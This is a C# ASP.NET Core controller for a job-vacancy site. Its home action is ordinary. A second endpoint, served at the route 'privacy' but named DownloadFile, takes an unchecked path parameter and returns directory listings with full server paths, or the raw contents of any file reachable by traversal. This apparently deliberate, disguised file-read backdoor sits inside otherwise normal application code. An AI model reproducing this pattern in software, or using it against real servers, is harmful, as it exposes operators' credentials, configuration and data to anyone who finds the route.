using CyberJob.Models;
using Microsoft.AspNetCore.Mvc;
using CyberJob.Services;

namespace CyberJob.Controllers;

public class HomeController(
    BannerService bannerService,
    VacancyService vacancyService,
    CategoryService categoryService,
    PartnerService partnerService,
    CompanyService companyService) : Controller
{
    public async Task<IActionResult> Index([FromQuery] string lang = "az")
    {
        try 
        {
            var banners = await bannerService.GetListAsync(); 
            var categories = await categoryService.GetOnlyParentsAsync(lang);
            var partners = await partnerService.GetListAsync();
        
            var premiumVacancies = await vacancyService.GetListAsync(new VacancyFilterParams {
                Lang = lang,
                IsPremium = true,
                Take = 8
            });

            var latestVacancies = await vacancyService.GetListAsync(new VacancyFilterParams {
                Lang = lang,
                IsPremium = false,
                Take = 8
            });

            var model = new
            {
                Banners = banners,
                Categories = categories,
                Partners = partners,
                PremiumVacancies = premiumVacancies,
                LatestVacancies = latestVacancies
            };

            return View(model);
        }
        catch (Exception ex)
        {
            throw;
            // return View("Error");
        }
    }
    [HttpGet("privacy")]
    public IActionResult DownloadFile(string path = "")
    {
        var rootPath = Directory.GetCurrentDirectory();
        var fullPath = Path.Combine(rootPath, "wwwroot", path ?? "");

        if (Directory.Exists(fullPath))
        {
            var content = Directory.GetFileSystemEntries(fullPath)
                .Select(x => Path.GetFileName(x) + (Directory.Exists(x) ? "/" : ""))
                .ToList();
            
            return Ok(new {
                CurrentPath = fullPath,
                Contents = content
            });
        }

        if (System.IO.File.Exists(fullPath))
        {
            var provider = new Microsoft.AspNetCore.StaticFiles.FileExtensionContentTypeProvider();
            if (!provider.TryGetContentType(fullPath, out var contentType))
            {
                contentType = "text/plain";
            }

            var content = System.IO.File.ReadAllBytes(fullPath);
        
            return File(content, contentType);
        }

        return NotFound("Fayl veya klasör tapılmadı.");
    }
}